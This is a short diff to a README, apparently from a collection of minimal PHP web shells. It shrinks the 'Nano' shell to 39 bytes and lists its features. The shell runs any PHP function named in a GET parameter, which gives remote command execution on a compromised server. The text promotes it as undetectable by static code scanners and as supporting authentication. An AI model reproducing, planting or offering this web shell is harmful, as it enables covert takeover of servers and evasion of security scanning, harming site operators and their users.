@@ -7,10 +7,10 @@ For example, if short tags are disabled, you will need to replace <? with <?php.
 
 ### Nano
 ```php
-<?$x=$_GET;(@$x[p]=='_'?@$x[f]($x[c]):1);
+<?$x=$_GET;@$x[p]=='_'?@$x[f]($x[c]):1;
 ```
 #### Features
-- 41 bytes in size
+- 39 bytes in size
 - Can't be detected by static code scanners
 - Supports authentication
 - No warnings on this fork version!
